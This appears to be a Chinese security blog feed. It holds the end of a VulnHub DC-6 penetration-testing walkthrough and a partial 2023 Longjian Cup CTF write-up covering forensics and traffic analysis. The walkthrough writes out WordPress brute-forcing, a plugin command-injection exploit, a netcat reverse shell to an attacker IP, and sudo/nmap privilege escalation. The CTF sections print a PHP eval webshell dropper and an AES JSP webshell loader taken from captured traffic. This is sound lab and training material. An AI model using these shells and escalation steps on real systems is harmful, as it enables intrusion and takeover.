alt="image-20240118215758484"></p><p>能看到是一个wordpress的网站</p><h3 id="三、网站信息搜集"><a href="#三、网站信息搜集" class="headerlink" title="三、网站信息搜集"></a>三、网站信息搜集</h3><h4 id="使用whatweb看网站信息"><a href="#使用whatweb看网站信息" class="headerlink" title="使用whatweb看网站信息"></a>使用whatweb看网站信息</h4><pre><code>whatweb -v 192.168.160.157</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182158418.png" alt="image-20240118215835245"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182159742.png" alt="image-20240118215918499"></p><p>看到wordpress的版本是5.1.1</p><h4 id="使用dirsearch-py扫目录"><a href="#使用dirsearch-py扫目录" class="headerlink" title="使用dirsearch.py扫目录"></a>使用dirsearch.py扫目录</h4><pre><code>python3 ./dirsearch.py -u http://192.168.160.157</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182210224.png" alt="image-20240118221023088"></p><p>扫到了该网站wordpress的后台登陆页面 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182219850.png" alt="image-20240118221904796"></p><p>还扫到了一个目录页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182219324.png" alt="image-20240118221933265"></p><h4 id="使用cewl搜集网站登录密码"><a href="#使用cewl搜集网站登录密码" class="headerlink" title="使用cewl搜集网站登录密码"></a>使用cewl搜集网站登录密码</h4><p>既然扫到了网站后台登陆页面 我们就来搜集一波网站里面的密码 使用cewl</p><p>cewl的使用姿势在DC-2的文章中有提到<a href="https://w3nx1z1.github.io/2023/11/21/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-2/">DC-2通关记录</a></p><pre><code>cewl http://wordy/ -w dc6dict.txt从网站中获取密码并将其保存在dc6dict.txt文件中</code></pre><h4 id="首页信息"><a href="#首页信息" class="headerlink" title="首页信息"></a>首页信息</h4><p>网站首页的信息提示我们可能与插件有关</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182232914.png" alt="image-20240118223258687"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182233611.png" alt="image-20240118223314553"></p><h3 id="四、wpscan爆破网站密码"><a href="#四、wpscan爆破网站密码" class="headerlink" title="四、wpscan爆破网站密码"></a>四、wpscan爆破网站密码</h3><p>我们已经有了网站密码字典 在使用wpscan扫一下网站用户名字典</p><pre><code>wpscan --url http://wordy/ -e u </code></pre><p>扫出来五个用户</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182238256.png" alt="image-20240118223810205"></p><p>制作一个用户名字典 写入这些用户名 使用wpscan开始爆破</p><pre><code>wpscan wpscan --url http://dc-2/ -P dc6dict.txt -U user.txt</code></pre><p>没爆出来 那我们换个字典 直接使用kali里面自带的字典<code>rockyou.txt</code> 并且作者在靶场下载页面处还给了一个提示 方便我们缩小密码字典范围 便于爆破</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182305673.png" alt="image-20240118230529591"></p><pre><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txtwpscan --url http://wordy/ -P passwords.txt -U user.txt </code></pre><p>爆破出一组账号密码<code>mark / helpdesk01</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182308006.png" alt="image-20240118230819959"></p><p>使用这组账号密码登陆 网站后台 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182309959.png" alt="image-20240118230928877"></p><h3 id="五、漏洞发现与利用"><a href="#五、漏洞发现与利用" class="headerlink" title="五、漏洞发现与利用"></a>五、漏洞发现与利用</h3><h4 id="activity-monitor插件漏洞"><a href="#activity-monitor插件漏洞" class="headerlink" title="activity monitor插件漏洞"></a>activity monitor插件漏洞</h4><p>登陆进去之后 可以看到有一个<code>activity monitor</code> 插件 结合首页上的提示 猜测这个插件有漏洞</p><h5 id="方法一：使用searchsploit搜索漏洞利用脚本"><a href="#方法一：使用searchsploit搜索漏洞利用脚本" class="headerlink" title="方法一：使用searchsploit搜索漏洞利用脚本"></a>方法一：使用searchsploit搜索漏洞利用脚本</h5><p>直接使用searchsploit搜索漏洞脚本</p><pre><code>searchsploit activity monitor</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281609102.png" alt="image-20240228160910052"></p><p>直接找一下最后一个</p><pre><code>searchsploit -p 50110.py</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281609279.png" alt="image-20240228160944243"></p><pre><code>cp /usr/share/exploitdb/exploits/php/webapps/50110.py 50110.py</code></pre><p>看一下里面的内容 用法里面写着直接python运行就可以了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281627638.png" alt="image-20240228162714585"></p><p>成功拿到权限 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281629064.png" alt="image-20240228162938028"></p><p>为了便于操作 我们在反弹shell并创建一个新的交互式终端</p><pre><code>nc -e /bin/bash 192.168.160.131 4444   nc -lvvp 4444python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281939666.png" alt="image-20240228193904627"></p><h5 id="方法二：在页面插件处进行命令执行"><a href="#方法二：在页面插件处进行命令执行" class="headerlink" title="方法二：在页面插件处进行命令执行"></a>方法二：在页面插件处进行命令执行</h5><p>还是在插件的页面  我们找到了一处可以注入的点</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281916924.png" alt="image-20240228191642845"></p><p>lookup按钮会将填入的ip地址解析为主机名 我们尝试随便写一个ip地址并注入命令进行抓包测试</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281922648.png" alt="image-20240228192247557"></p><p>很明显 后面我们注入的<code>ls</code>命令被成功执行了 那就可以在这个页面进行命令注入反弹shell 在创建一个交互式终端</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282016344.png" alt="image-20240228201634263"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282016870.png" alt="image-20240228201646830"></p><h3 id="六、提权-nmap提权"><a href="#六、提权-nmap提权" class="headerlink" title="六、提权(nmap提权)"></a>六、提权(nmap提权)</h3><p>在文件系统中进行翻找 在<code>/home/mark/stuff</code>文件夹下找到一个<code>things-to-do.txt</code>文件 读取文件内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282033562.png" alt="image-20240228203350516"></p><pre><code>Things to do:- Restore full functionality for the hyperdrive (need to speak to Jens)- Buy present for Sarah&#39;s farewell party- Add new user: graham - GSo7isUM1D4 - done- Apply for the OSCP course- Buy new laptop for Sarah&#39;s replacement</code></pre><p>在这里面找到了用户<code>graham</code>的登录密码<code>GSo7isUM1D4</code> 切换用户</p><p>查看可以使用的sudo权限命令</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282057054.png" alt="image-20240228205758013"></p><p>发现这个<code>/home/jens/backups.sh</code>文件可以无密码执行  读一下内容</p><pre><code>#!/bin/bashtar -czf backups.tar.gz /var/www/html</code></pre><p>将<code>/bin/bash</code>写入这个文件 在运行 就可以获得jens权限的shell(因为backups.sh可以无密码运行)</p><pre><code class="bash">echo &quot;/bin/bash&quot; &gt;&gt;backups.shsudo -u jens /home/jens/backups.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282109825.png" alt="image-20240228210914783"></p><p>再次查看jens用户拥有的sudo权限命令 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282109205.png" alt="image-20240228210958162"></p><p>发现可以无密码使用nmap 直接找一下nmap提权</p><p><a href="https://blog.csdn.net/zijiaijd/article/details/117165224?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170912594416800197039668%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170912594416800197039668&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-117165224-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=nmap%E6%8F%90%E6%9D%83&spm=1018.2226.3001.4187">nmap提权几种方式</a>  这里我们选择方法二  使用nmap –script参数执行脚本</p><pre><code class="bash">echo &#39;os.execute(&quot;/bin/bash&quot;)&#39; &gt; 1.nse # nse是nmao插件扩展名sudo nmap --script=/home/jens/1.useid</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282120403.png" alt="image-20240228212018376"></p><pre><code>cd /rootcat theflag.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282120269.png" alt="image-20240228212047220"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此 DC-6渗透完毕</p><pre><code>wpscan爆破密码activity monitor插件漏洞nmap提权</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-6&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-6&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-6&quot;&gt;&lt;/a&gt;vulnhub靶场DC-6&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;&gt;&lt;a href=&quot;#靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2023陇剑杯</title>
    <link href="http://w3nx1z1.github.io/2024/02/27/2023%E9%99%87%E5%89%91%E6%9D%AF/"/>
    <id>http://w3nx1z1.github.io/2024/02/27/2023%E9%99%87%E5%89%91%E6%9D%AF/</id>
    <published>2024-02-27T13:29:27.717Z</published>
    <updated>2024-02-28T07:10:13.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023陇剑杯初赛"><a href="#2023陇剑杯初赛" class="headerlink" title="2023陇剑杯初赛"></a>2023陇剑杯初赛</h1><pre><code>陇剑杯初赛的时候正好赶上我在带训 实在不好请假 遗憾错过流量分析杯 遂来复现一手</code></pre><h2 id="baby-forensics"><a href="#baby-forensics" class="headerlink" title="baby_forensics"></a>baby_forensics</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040033023.png" alt="image-20240204003301941"></p><p>要key  直接找关于key的文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 filescan | findstr &quot;key&quot;.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003df94070 -D E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a</code></pre><p>导出来 重新命名为key.txt 内容是</p><pre><code>E96&lt;6J:Da6g_b_f_gd75a3d4ch4heg4bab66ad5d     </code></pre><p>估计还得在操作  随波逐流梭了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040052245.png" alt="image-20240204005247186"></p><pre><code>thekeyis2e80307085fd2b5c49c968c323ee25d5</code></pre><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040053671.png" alt="image-20240204005326608"></p><p>要计算机就提取计算器的进程</p><p>积累一下 计算器在计算机中的进程是<code>calc.exe</code></p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 pslist</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040055638.png" alt="image-20240204005552594"></p><p>导出来保存为data文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 memdump -p 2844 -D E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a</code></pre><p>将1.data放到kali的gimp里面查看图像 需要调一下高度、宽度和偏移值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040112762.png" alt="image-20240204011216677"></p><p>得到计算器中的数字</p><pre><code>7598632541</code></pre><p>看wp还学到了一种做法 我们使用vol2的windows插件 并将其另存为<code>windows</code>文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 windows &gt;windows</code></pre><p>在这个文件里面直接翻 计算器的进程<code>calc.exe</code> 直接找到计算器的运行结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402102309685.png" alt="image-20240210230950647"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272127039.png" alt="image-20240204120242491"></p><p>在使用r-studio翻找关键文件的时候 在Music文件夹找到一个<code>i4ak3y</code>文件 打开查看内容 应该是一个解密密钥</p><pre><code>qwerasdf</code></pre><p>这道题我们需要用到计算机中便签的进程 也就是<code>StikyNot.exe</code></p><pre><code>StikyNot.exe 是Windows操作系统中的一个应用程序，也就是桌面上的便签小工具。它的主要作用是提供一个简单的方式来创建、编辑和管理便签，以便用户可以在桌面上快速记录和查看重要的信息、提醒事项或备忘录。关于StikyNot.exe 的内存的作用，它主要用于存储和管理用户创建的便签内容。当用户打开StikyNot.exe 应用程序时，操作系统会为该程序分配一定的内存空间，用于存储便签的文本、颜色、位置等信息。这样，当用户关闭应用程序或重新启动计算机时，便签的内容仍然可以被保存下来，以便下次使用时能够恢复之前的状态。总结来说，StikyNot.exe 的内存的作用是为了存储和管理用户创建的便签内容，确保便签信息的持久性和可恢复性。</code></pre><p>找到StikyNot.exe进程并将其提取出来 PID是2968</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111603493.png" alt="image-20240211160329431"></p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 memdump -p 2968 -D E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a</code></pre><p>将后缀改为data  使用gimp打开 调一下宽高</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111620937.png" alt="image-20240211162030868"></p><p>看到一串字符</p><pre><code>U2FsdGVkX195MCsw0ANs6/Vkjibq89YlmnDdY/dCNKRkixvAP6+B5ImXr2VIqBSp94qfIcjQhDxPgr9G4u++pA==</code></pre><p>看到<code>U2Fsd</code>的头 想到很多使用对称加密在线网站的结果都有这个头 在结合上面找到的密码 直接进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111652856.png" alt="image-20240211165231813"></p><p>也可以直接在内存文件里面翻 有<code>U2Fsd</code>头的内容进行解密 但是多少还是有点草率</p><p>也可以写个check函数帮助筛选内存文件中可能是flag的内容 参考下面文章</p><p><a href="https://blog.csdn.net/Ahi0upsec/article/details/132549714?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170757131916800184120961%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170757131916800184120961&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-132549714-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=2023%E9%99%87%E5%89%91%E6%9D%AF&spm=1018.2226.3001.4187">2023陇剑杯wp</a></p><pre><code class="bash">#!/bin/bashcheck() &#123;    pattern=&quot;flag|==|10210897103|666c6167|464C4147|Zmxh|Wm14aFoz|&amp;#102|58s4vb|2uk2h3|key|pass|pwd|password|hint|U2FsdGVkX1&quot;    &gt; check.txt  # 清空或创建 check.txt 文件    grep -irlE &quot;$pattern&quot; 1.raw | while read -r file; do        echo -e &quot;File: $file&quot; &gt;&gt; check.txt        strings &quot;$file&quot; | grep -iE &quot;$pattern&quot; &gt;&gt; check.txt        echo -e &quot;&quot; &gt;&gt; check.txt    done&#125;check  # 调用 check 函数echo &quot;检查完成，请查看 check.txt 文件&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111713412.png" alt="image-20240211171337367"></p><h2 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111716058.png" alt="image-20240211171631986"></p><p>看了一下分组计数器 4xx很多 说明还是存在目录扫描的 我的思路还是先从响应码200的请求包开始找  先筛选一下</p><pre><code>http.response.code == 200</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111753613.png" alt="image-20240211175345527"></p><p>不是很多 从上到下翻找一下 第三个包找到了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111758514.png" alt="image-20240211175852466"></p><pre><code>a=file_put_contents%28%27d00r.php%27%2C+base64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs%2FPg%3D%3D%27%29%29%3B</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111759380.png" alt="image-20240211175932288"></p><p>到这可能觉得<code>d00r.php</code>就是正确答案了 但是在比赛的时候提交是不正确的 那就在往上一级找一下  那就是<code>ViewMore.php</code></p><h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111801971.png" alt="image-20240211180120905"></p><p>在上一题后面继续往后翻 看到使用了ifconfig命令  这个包是第10098流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402120009624.png" alt="image-20240212000917581"></p><p>在追踪一下http流 看一下获取ip地址的结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122241297.png" alt="image-20240212224132249"></p><p>上面的192.168.160.130是已经出现的 那下面的192.168.160.132就是服务器ip了</p><pre><code>192.168.160.132</code></pre><h3 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111805362.png" alt="image-20240211180507299"></p><p>还是一样在http流里面看 先看到读取了passwd文件的内容 <code>7e03864b0db7e6f9</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122309057.png" alt="image-20240212230949011"></p><p>还找到写入了一个base64编码的文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122159971.png" alt="image-20240212215923913"></p><p>是个压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122317638.png" alt="image-20240212231726573"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272127100.png" alt="image-20240212231740914"></p><p>将压缩包保存下来  尝试使用上面读取的密码解压 得到key.txt</p><pre><code>7d9ddff2-2d67-4eba-9e48-b91c26c42337</code></pre><h2 id="hacked"><a href="#hacked" class="headerlink" title="hacked"></a>hacked</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272127575.png" alt="image-20240212232426112"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132329684.png" alt="image-20240213232909590"></p><p> 追踪register页面可以找到加密算法</p><pre><code class="javascript">  &lt;script language=&quot;javascript&quot;&gt;    crypt_key = &#39;l36DoqKUYQP0N7e1&#39;;  crypt_iv = &#39;131b0c8a7a6e072e&#39;;  var key = CryptoJS.enc.Utf8.parse(crypt_key);   var iv = CryptoJS.enc.Utf8.parse(crypt_iv);   function Encrypt(word)&#123;    srcs = CryptoJS.enc.Utf8.parse(word);    var encrypted = CryptoJS.AES.encrypt(srcs, key, &#123; iv: iv,mode:CryptoJS.mode.CBC,padding: CryptoJS.pad.Pkcs7&#125;);    return encrypted.toString();  &#125;  function print()&#123;    var a = Encrypt(myform.username.value);    var b = Encrypt(myform.password.value);    &#125;</code></pre><p>写个解密脚本</p><pre><code class="python">from Crypto.Cipher import AESimport base64crypt_key = b&#39;l36DoqKUYQP0N7e1&#39;crypt_iv = b&#39;131b0c8a7a6e072e&#39;def decrypt(ciphertext):    cipher = AES.new(crypt_key, AES.MODE_CBC, crypt_iv)    decrypted = cipher.decrypt(base64.b64decode(ciphertext))    # 移除 PKCS7 填充    decrypted = _remove_pkcs7_padding(decrypted)    return decrypted.decode(&#39;utf-8&#39;)def _remove_pkcs7_padding(data):    padding_len = data[-1]    return data[:-padding_len]# 解密用户名和密码encrypted_username = &quot;pl3HJGsgs1Zn43qjV5Qx8w==&quot;decrypted_username = decrypt(encrypted_username)print(&#39;Decrypted Username:&#39;, decrypted_username)encrypted_password = &quot;pl3HJGsgs1Zn43qjV5Qx8w==&quot;decrypted_password = decrypt(encrypted_password)print(&#39;Decrypted Password:&#39;, decrypted_password)</code></pre><p>用上面这组用户名和密码 解出来为<code>aaa/aaa</code> 我们同样追踪register页面 找到admIn的那一组就好</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132345081.png" alt="image-20240213234532033"></p><pre><code>flag&#123;WelC0m5_TO_H3re&#125;</code></pre><h3 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132333038.png" alt="image-20240213233302974"></p><p>第68个流看到一串很奇妙的字符 直接搜索SECRET_KEY </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132347439.png" alt="image-20240213234748388"></p><p>解码一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132347671.png" alt="image-20240213234759606"></p><pre><code>ssti_flask_hsfvaldb</code></pre><h3 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132348796.png" alt="image-20240213234820734"></p><p>是flask的session注入漏洞 需要用到<code>flask-session-cookie-manager</code>这个工具来解密session</p><p>用法就是</p><pre><code>python3 ./flask_session_cookie_manager.py -c cookie密文 -s 密钥</code></pre><p>然后在流量包里面解密session值就可以了 密钥就是上面第二题<code>ssti_flask_hsfvaldb</code></p><p>我们直接看回显 像这种正常在页面上回显的基本上没有什么问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182049988.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182050900.png"></p><p>直接找有问题的 一个没有回显 一个回显None</p><p>![(<a href="https://raw.githubusercontent.com/w3n1z1/blogimage/main/image/202402182139955.png">https://raw.githubusercontent.com/w3n1z1/blogimage/main/image/202402182139955.png</a>)</p><p>求包看到了执行了whoami命令 返回包看到用户是red</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182140952.png" alt="image-20240218214056815"></p><p>因此 flask网站是由<code>red</code>用户启动的</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182141484.png" alt="image-20240218214151413"></p><p>一共就那么几个路由 都试试就出了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182149897.png" alt="image-20240218214937822"></p><pre><code>Index</code></pre><h2 id="hard-web"><a href="#hard-web" class="headerlink" title="hard_web"></a>hard_web</h2><h3 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182150196.png" alt="image-20240218215039122"></p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>看到这种找服务器开放端口的题 其实原理问的就是tcp三次握手 开放了端口肯定存在返回的ACK标志 那便需要我们找ACK标志</p><p>先判断服务器的ip地址  这个很好判断就是<code>192.168.162.180</code></p><p>使用tcpdump </p><pre><code>tcpdump -n -r /home/kali/Desktop/hard_web.pcap &#39;tcp[13] =18&#39; | awk &#39;&#123;print $3&#125;&#39; | sort -u </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182347584.png" alt="image-20240218234755533"></p><p>前三个就是 那么开放的端口就是<code>80 888 8888 </code></p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>也可以直接在wireshark里面进行筛选 条件语句可以这样写</p><pre><code>tcp.connection.synack and ip.dst==192.168.162.188</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182349623.png" alt="image-20240218234944540"></p><h3 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182350454.png" alt="image-20240218235010397"></p><p>在传入jsp脚本之后 第一次进行命令执行的包处 追踪http流 找到key加密的过程</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128052.png" alt="image-20240219171505923"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191752400.png" alt="image-20240219175250365"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402190014668.png" alt="image-20240219001430628"></p><pre><code class="javascript">&lt;%! String xc=&quot;748007e861908c03&quot;; class X extends ClassLoader&#123;    public X(ClassLoader z)&#123;        super(z);    &#125;public Class Q(byte[] cb)&#123;        return super.defineClass(cb, 0, cb.length);    &#125; &#125;public byte[] x(byte[] s,boolean m)&#123;     try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);        c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));        return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125;%&gt;&lt;%try&#123;    byte[] data=new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))];    java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);    if (session.getAttribute(&quot;payload&quot;)==null)&#123;        session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));    &#125;else&#123;        request.setAttribute(&quot;parameters&quot;, data);        Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();        java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();        f.equals(arrOut);        f.equals(pageContext);        f.toString();        response.getOutputStream().write(x(arrOut.toByteArray(), true));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</code></pre><p>可以看到有gunzip和aes aes加密的key也给了<code>748007e861908c03</code>   找到最后一个jsp加密流量 将密文以hex的形式转储</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191756710.png" alt="image-20240219175653599"></p><p>用厨子进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191757521.png" alt="image-20240219175752452"></p><h3 id="3-3"><a href="#3-3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191758211.png" alt="image-20240219175813153"></p><p>直接将aes的解密密钥解md5即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191806589.png" alt="image-20240219180602528"></p><pre><code>14mk3y</code></pre><h2 id="IncidentResponse"><a href="#IncidentResponse" class="headerlink" title="IncidentResponse"></a>IncidentResponse</h2><h3 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191807183.png" alt="image-20240219180755108"></p><p>首先对服务器进行挂载仿真</p><p>题目中给出了登陆服务器的账号密码<code>root/IncidentResponsePasswd</code> 直接登陆root账户 </p><p>这里我想的是先连上xshell 通过xftp将服务器中的文件下载下来 在使用D盾河马等工具进行扫描</p><p>在对服务器进行仿真挂载之后 选择NAT模式 使用ifconfig查看ip地址 会发现没有ens33网卡</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262041803.png" alt="image-20240226204115751"></p><p>找到一篇解决问题的文章<a href="https://blog.csdn.net/weixin_44365415/article/details/130108868?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170893659616800186546943%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170893659616800186546943&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-130108868-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%B2%A1%E6%9C%89ens33&spm=1018.2226.3001.4187">【ubuntu虚拟机】ens33未出现在ifconfig问题</a></p><pre><code>ifconfig ens33 updhclient ens33ifconfig</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262042502.png" 